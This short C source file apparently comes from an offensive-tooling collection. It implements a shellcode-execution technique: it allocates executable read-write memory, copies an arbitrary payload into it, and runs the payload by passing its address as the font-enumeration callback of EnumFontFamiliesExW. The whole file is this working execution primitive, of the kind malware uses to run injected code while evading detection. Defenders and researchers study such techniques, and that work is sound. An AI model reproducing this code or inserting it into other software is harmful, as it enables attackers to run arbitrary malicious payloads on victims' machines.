#include "Win32Helper.h"

VOID InvokeEnumFontFamiliesExWThreadCallbackRoutine(LPVOID lpParameter)
{
	LOGFONTW Font = { 0 };
	Font.lfCharSet = DEFAULT_CHARSET;

	EnumFontFamiliesExW(GetDC(NULL), &Font, (FONTENUMPROCW)lpParameter, NULL, NULL);
}

BOOL MpfSceViaEnumFontFamiliesExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumFontFamiliesExWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}